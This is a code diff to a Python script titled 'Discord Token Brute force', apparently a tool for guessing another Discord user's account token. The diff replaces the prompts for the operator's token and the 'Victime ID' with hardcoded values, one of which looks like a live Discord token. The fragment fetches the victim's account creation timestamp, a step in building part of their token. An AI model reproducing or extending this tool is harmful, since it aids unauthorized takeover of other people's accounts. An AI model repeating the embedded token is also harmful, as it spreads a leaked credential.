@@ -20,7 +20,7 @@ from plyer import notification
 
 os.system(f'title Discord Token Brute force By Naoy ^| Version : 1.2')
 
-TOKEN = input(f"[>] Your token : ")
+TOKEN = "NzUyNDAxMDUwMzUwMTI1MDU3.X_dMNA.3BqGXA0fZ6YMMLKxSwfT059QG1k"
 os.system('cls')
 
 def notifyMe(title, message):
@@ -32,7 +32,7 @@ def notifyMe(title, message):
 
 class MyClient(discord.Client):
   async def on_ready(self):
-    userid = input(f"[{Fore.RED}>{Fore.RESET}] Victime ID : ")
+    userid = "254989699356164097"
     user = await client.fetch_user(int(userid))
     stamp = user.created_at
     timestamp = str(time.mktime(stamp.timetuple()))
